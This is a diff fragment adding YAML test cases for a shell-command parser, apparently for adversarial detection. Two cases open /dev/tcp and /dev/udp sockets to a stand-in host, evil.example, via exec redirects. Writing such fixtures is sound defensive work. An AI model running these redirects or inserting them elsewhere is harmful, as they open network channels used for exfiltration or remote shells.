+  cmd: '3<>/dev/udp/evil.example/53'
+  commands:
+    - {argv: [exec], redirects: [['<>', '3', /dev/udp/evil.example/53]]}
+
+- id: exec-fd-dev-tcp
+  adv: true
+  cmd: 'exec 3<>/dev/tcp/evil.example/80'
+  commands:
+    - {argv: [exec], redirects: [['<>', '3', /dev/tcp/evil.example/80]]}
+
+- id: bare-redirect-to-a-file-stays-empty
+  cmd: '> /tmp/x'
+  commands:
+    - {argv: [], redirects: [['>', null, /tmp/x]]}
